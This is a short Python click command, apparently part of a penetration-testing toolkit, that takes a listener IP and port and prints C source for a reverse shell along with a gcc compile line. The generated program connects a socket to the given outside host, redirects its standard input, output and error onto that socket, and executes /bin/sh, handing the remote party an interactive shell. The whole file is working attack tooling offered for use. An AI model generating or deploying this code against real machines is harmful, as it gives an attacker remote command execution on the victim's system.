import click
from colorama import Fore

@click.command()
@click.argument("listener_ip")
@click.argument("listener_port")
@click.option("-r", "--raw", is_flag=True, default=False, help="Print source only (no label).")
def command(listener_ip, listener_port, raw):
    """Return C reverse shell source code. Compile with: gcc shell.c -o shell"""
    src = f"""#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void) {{
    int port = {listener_port};
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("{listener_ip}");

    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {{"/bin/sh", NULL}};
    execve("/bin/sh", argv, NULL);

    return 0;
}}"""
    if not raw:
        click.secho(f"{Fore.LIGHTGREEN_EX}C reverse shell (compile: gcc shell.c -o shell):\n{Fore.WHITE}{src}")
    else:
        click.secho(src, nl=False)
